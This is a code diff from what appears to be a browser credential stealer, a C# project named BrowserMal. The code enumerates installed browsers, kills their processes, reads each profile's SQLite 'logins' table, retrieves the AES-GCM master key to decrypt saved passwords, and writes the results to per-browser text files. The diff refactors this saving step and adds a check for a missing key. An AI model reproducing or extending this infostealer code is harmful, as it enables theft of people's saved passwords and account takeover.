@@ -6,12 +6,14 @@ using System.Text;
 using SqliteReader;
 using BrowserMal.Browser;
 using BrowserMal.AES;
+using BrowserMal.Credential;
 
 namespace BrowserMal
 {
     public class Class1
     {
-        private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
+        //private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
+
         private static readonly BrowserManager browserManager = new BrowserManager();
 
         /*private static void GetCookies()
@@ -80,7 +82,6 @@ namespace BrowserMal
             File.WriteAllText(Path.Combine(desktop, "passwordsBro", "cookies.txt"), sb.ToString());
         }*/
 
-
         public static void Start()
         {
             List<CredentialModel> result = new List<CredentialModel>();
@@ -88,24 +89,19 @@ namespace BrowserMal
 
             foreach (BrowserModel browser in browserManager.GetBrowsers())
             {
+                result.Clear();
+
                 if (!BrowserExists(browser.Location))
                     continue;
 
                 KillProcess(browser.ProcessName);
                 result.AddRange(GetLogins(browser.Location));
+
+                if (result.Count == 0)
+                    continue;
+
+                File.FileManager.Save<CredentialModel>(result, $"{browser.Name}_logins.txt");
             }
-
-            SaveLogins(result);
-        }
-
-        private static void SaveLogins(List<CredentialModel> credentials)
-        {
-            StringBuilder sb = new StringBuilder();
-
-            foreach (CredentialModel credentialsItem in credentials)
-                sb.AppendLine(credentialsItem.ToString());
-
-            File.WriteAllText("logins.txt", sb.ToString());
         }
 
         private static List<CredentialModel> GetLogins(string path)
@@ -115,7 +111,7 @@ namespace BrowserMal
 
             foreach (string profile in profiles)
             {
-                if (!File.Exists(profile))
+                if (!System.IO.File.Exists(profile))
                     continue;
 
                 creds.AddRange(GetProfileLogins(profile));
@@ -132,6 +128,9 @@ namespace BrowserMal
             sqLiteHandler.ReadTable("logins");
 
             byte[] masterKey = AesGcm256.GetMasterKey(path);
+
+            if (masterKey == null)
+                return new List<CredentialModel>();
 
             for (int i = 0; i <= sqLiteHandler.GetRowCount() - 1; i++)
             {
